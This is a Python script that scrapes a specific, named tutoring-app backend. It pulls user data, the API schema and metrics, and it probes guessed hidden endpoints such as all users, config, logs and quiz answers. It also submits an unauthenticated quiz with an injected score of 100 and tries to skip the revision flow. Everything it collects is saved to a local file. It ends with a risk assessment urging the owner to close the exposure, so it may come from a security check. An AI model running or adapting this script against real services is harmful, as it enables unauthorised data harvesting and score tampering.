import requests
import json
from datetime import datetime
import pandas as pd

print("="*60)
print("BRIMAI DATA EXTRACTION - EXPOSED ENDPOINTS")
print("="*60)

backend_url = "https://fastapi-tutor-app-backend-208251878692.asia-south1.run.app"
extracted_data = {}

def extract_json_data(endpoint, method="GET", data=None):
    """Extract data from endpoint"""
    try:
        if method == "GET":
            response = requests.get(backend_url + endpoint, timeout=10)
        else:
            response = requests.post(backend_url + endpoint, json=data, timeout=10)
            
        if response.status_code == 200:
            try:
                json_data = response.json()
                return True, json_data
            except:
                return True, response.text[:500]
        else:
            return False, f"Status: {response.status_code}"
    except Exception as e:
        return False, str(e)

print("\n[1] EXTRACTING USER DATA")
print("-"*60)

# Extract user data
success, data = extract_json_data("/api/user")
if success:
    print("✓ USER DATA EXTRACTED:")
    print(json.dumps(data, indent=2))
    extracted_data["user_data"] = data
else:
    print(f"✗ Failed: {data}")

print("\n[2] EXTRACTING ALL SUBJECTS")
print("-"*60)

success, data = extract_json_data("/subjects/")
if success:
    print("✓ SUBJECTS EXTRACTED:")
    if isinstance(data, list):
        print(f"Total subjects: {len(data)}")
        for i, subject in enumerate(data):
            print(f"  {i+1}. {subject}")
        extracted_data["subjects"] = data
    else:
        print(data)
else:
    print(f"✗ Failed: {data}")

print("\n[3] EXTRACTING TOPICS FOR EACH SUBJECT")
print("-"*60)

if "subjects" in extracted_data:
    topics_data = {}
    for subject in extracted_data["subjects"]:
        subject_name = subject.get("name", subject) if isinstance(subject, dict) else subject
        endpoint = f"/{subject_name}/topics/"
        
        print(f"\nTrying to get topics for: {subject_name}")
        success, data = extract_json_data(endpoint)
        if success:
            print(f"  ✓ Found {len(data) if isinstance(data, list) else 'some'} topics")
            if isinstance(data, list):
                for topic in data[:3]:  # Show first 3
                    print(f"    - {topic}")
                if len(data) > 3:
                    print(f"    ... and {len(data) - 3} more")
            topics_data[subject_name] = data
        else:
            print(f"  ✗ No access to topics")
    
    extracted_data["topics"] = topics_data

print("\n[4] EXTRACTING API DOCUMENTATION")
print("-"*60)

# Get API schema
success, data = extract_json_data("/openapi.json")
if success:
    print("✓ API SCHEMA EXTRACTED:")
    if isinstance(data, dict):
        # Extract all endpoints
        if "paths" in data:
            print(f"\nALL API ENDPOINTS ({len(data['paths'])}):")
            for path, methods in data["paths"].items():
                for method, details in methods.items():
                    print(f"  {method.upper()} {path}")
                    if "summary" in details:
                        print(f"    → {details['summary']}")
                    if "parameters" in details:
                        print(f"    Parameters: {[p.get('name') for p in details['parameters']]}")
        
        # Extract schemas/models
        if "components" in data and "schemas" in data["components"]:
            print(f"\nDATA MODELS ({len(data['components']['schemas'])}):")
            for schema_name in list(data['components']['schemas'].keys())[:5]:
                print(f"  - {schema_name}")
        
        extracted_data["api_schema"] = data
else:
    print(f"✗ Failed: {data}")

print("\n[5] EXTRACTING METRICS DATA")
print("-"*60)

success, data = extract_json_data("/metrics")
if success:
    print("✓ METRICS DATA EXTRACTED:")
    if isinstance(data, str):
        # Parse metrics format (usually Prometheus format)
        lines = data.split('\n')[:20]  # First 20 lines
        for line in lines:
            if line and not line.startswith('#'):
                print(f"  {line}")
    else:
        print(json.dumps(data, indent=2)[:500])
    extracted_data["metrics"] = data
else:
    print(f"✗ Failed: {data}")

print("\n[6] TESTING DASHBOARD ACCESS")
print("-"*60)

# Try to access dashboard data
test_dashboards = [
    "/dashboard/math/algebra/",
    "/dashboard/English/grammar/",
    "/revise/stats"
]

for endpoint in test_dashboards:
    success, data = extract_json_data(endpoint)
    if success:
        print(f"✓ DASHBOARD DATA FROM {endpoint}:")
        print(f"  {json.dumps(data, indent=2)[:200]}...")
        extracted_data[f"dashboard_{endpoint}"] = data

print("\n[7] CHECKING FOR HIDDEN DATA")
print("-"*60)

# Try common data endpoints
hidden_endpoints = [
    "/api/users",  # All users
    "/api/users/all",
    "/api/config",
    "/api/settings",
    "/api/stats",
    "/api/analytics",
    "/api/logs",
    "/api/quiz/answers",  # Quiz answers!
    "/api/quiz/results",
    "/api/leaderboard",
    "/api/scores"
]

for endpoint in hidden_endpoints:
    success, data = extract_json_data(endpoint)
    if success:
        print(f"✓ FOUND HIDDEN DATA at {endpoint}:")
        if isinstance(data, list):
            print(f"  Contains {len(data)} items")
        else:
            print(f"  {str(data)[:100]}...")
        extracted_data[endpoint] = data

print("\n[8] ATTEMPTING TO ACCESS WITHOUT PROPER FLOW")
print("-"*60)

# Try to submit quiz without authentication
quiz_payload = {
    "answers": {"1": "A", "2": "B", "3": "C"},
    "time_taken": 60,
    "score": 100  # Try to inject score
}

success, data = extract_json_data("/quiz1/", method="POST", data=quiz_payload)
if success:
    print("✓ QUIZ SUBMISSION WITHOUT AUTH:")
    print(f"  Response: {data}")

# Try to access revision without completing quiz
success, data = extract_json_data("/revise/", method="POST", 
                                 data={"subject": "math", "topic": "algebra"})
if success:
    print("✓ REVISION ACCESS WITHOUT QUIZ:")
    print(f"  Response: {data}")

print("\n" + "="*60)
print("DATA EXTRACTION SUMMARY")
print("="*60)

# Summary
total_extracted = len(extracted_data)
print(f"\nTotal endpoints with exposed data: {total_extracted}")

if extracted_data:
    print("\nEXPOSED DATA INCLUDES:")
    for key in extracted_data.keys():
        if isinstance(extracted_data[key], list):
            print(f"  - {key}: {len(extracted_data[key])} items")
        elif isinstance(extracted_data[key], dict):
            print(f"  - {key}: {len(extracted_data[key])} fields")
        else:
            print(f"  - {key}: {type(extracted_data[key]).__name__}")

# Save all extracted data
filename = f"extracted_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
with open(filename, "w", encoding='utf-8') as f:
    json.dump(extracted_data, f, indent=2, ensure_ascii=False)

print(f"\n✓ All extracted data saved to: {filename}")

# Create a readable report
print("\n" + "="*60)
print("CRITICAL SECURITY FINDINGS")
print("="*60)

if "subjects" in extracted_data:
    subjects = extracted_data["subjects"]
    print(f"\n❌ EXPOSED: All {len(subjects)} subjects including:")
    for subj in subjects[:5]:
        print(f"   - {subj}")

if "api_schema" in extracted_data:
    print(f"\n❌ EXPOSED: Complete API documentation with {len(extracted_data['api_schema'].get('paths', {}))} endpoints")

if "user_data" in extracted_data:
    print(f"\n❌ EXPOSED: User data endpoint returns: {extracted_data['user_data']}")

print("\n⚠️  RISK ASSESSMENT:")
print("1. Competitors can see your entire course structure")
print("2. Attackers know all your API endpoints")
print("3. Users can bypass payment/authentication")
print("4. Quiz answers might be accessible")
print("5. Server metrics expose internal information")

print("\n🔥 IMMEDIATE ACTION REQUIRED:")
print("This data should NOT be publicly accessible!")
